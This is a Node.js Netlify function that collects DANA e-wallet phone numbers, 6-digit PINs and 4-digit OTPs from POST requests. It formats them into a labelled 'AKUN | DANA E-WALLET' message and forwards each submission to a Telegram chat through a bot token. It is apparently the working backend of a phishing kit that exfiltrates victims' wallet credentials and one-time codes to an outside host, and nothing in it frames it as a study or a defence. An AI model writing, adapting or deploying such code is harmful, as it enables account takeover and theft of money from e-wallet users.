const axios = require('axios');

/**
 * Formats the DANA account information in the requested box-style format
 * @param {string} phone - User's phone number
 * @param {string|null} pin - 6-digit PIN (optional)
 * @param {string|null} otp - 4-digit OTP (optional)
 * @returns {string} Formatted message for Telegram
 */
function formatDanaMessage(phone, pin = null, otp = null) {
  // Clean phone number (remove all non-digit characters)
  const cleanPhone = phone.replace(/\D/g, '');
  
  // Format with proper indonesian phone number prefix
  const formattedPhone = cleanPhone.startsWith('0') ? '62' + cleanPhone.substring(1) : cleanPhone;

  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${formattedPhone}\n`;

  // Add PIN section if provided
  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  // Add OTP section if provided
  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  // Add closing and timestamp (WIB timezone)
  message += "╰───────────────────\n" +
             `⏱️ ${new Date().toLocaleString('id-ID', {
               timeZone: 'Asia/Jakarta',
               day: '2-digit',
               month: '2-digit',
               year: 'numeric',
               hour: '2-digit',
               minute: '2-digit',
               second: '2-digit'
             })}`;

  return message;
}

/**
 * Netlify Function handler
 */
exports.handler = async (event) => {
  // Validate HTTP method
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ 
        error: 'Method Not Allowed',
        message: 'Only POST requests are accepted' 
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    // Parse and validate request body
    const { type, phone, pin, otp } = JSON.parse(event.body);
    
    // Basic validation
    if (!type || !phone) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Bad Request',
          message: 'Type and phone number are required' 
        })
      };
    }

    // Phone number validation
    const cleanPhone = phone.replace(/\D/g, '');
    if (cleanPhone.length < 10 || !/^\d+$/.test(cleanPhone)) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid Phone Number',
          message: 'Phone number must be at least 10 digits' 
        })
      };
    }

    // PIN validation (if provided)
    if (pin && (pin.length !== 6 || !/^\d+$/.test(pin))) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid PIN',
          message: 'PIN must be 6 digits' 
        })
      };
    }

    // OTP validation (if provided)
    if (otp && (otp.length !== 4 || !/^\d+$/.test(otp))) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid OTP',
          message: 'OTP must be 4 digits' 
        })
      };
    }

    // Get Telegram credentials from environment
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!botToken || !chatId) {
      console.error('Missing Telegram credentials in environment variables');
      throw new Error('Server configuration incomplete');
    }

    // Format the message
    const message = formatDanaMessage(cleanPhone, pin, otp);
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Send to Telegram
    const telegramResponse = await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    }, { 
      timeout: 5000,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    // Return success response
    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        message: 'Data sent successfully',
        telegram: {
          message_id: telegramResponse.data.result.message_id,
          timestamp: new Date().toISOString()
        }
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (error) {
    console.error('Error processing request:', error);
    
    // Handle different error types
    let statusCode = 500;
    let errorMessage = 'Internal Server Error';
    
    if (error.response) {
      // Telegram API error
      statusCode = 502;
      errorMessage = 'Telegram API Error: ' + error.response.status;
    } else if (error.request) {
      // No response from Telegram
      statusCode = 504;
      errorMessage = 'Telegram API Timeout';
    }
    
    return {
      statusCode,
      body: JSON.stringify({
        error: errorMessage,
        details: error.message
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }
};
